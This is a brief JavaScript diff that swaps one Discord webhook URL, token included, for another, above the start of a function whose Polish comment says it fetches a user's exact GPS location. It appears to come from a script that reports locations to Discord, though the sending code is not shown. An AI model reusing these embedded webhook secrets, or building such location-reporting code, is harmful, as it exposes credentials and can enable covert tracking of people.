@@ -1,4 +1,4 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1473802841083740358/Fa1WpPDsIQiDj6aNqjIJj1jXvn81VJZT7nvALQpr4BDDBFufLuaxpySl1tq0DXFVwtX1";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1474024817714794639/SmQ15Kw9acHrxaffk5FX86ZCba7fwf6nhU9w8IAcw2ri0XgBnBi_d5-TgxGlXcxUCpeE";
 
 // Funkcja do pobrania dokładnej lokalizacji GPS (wymaga zgody użytkownika)
 async function getGPSLocation() {
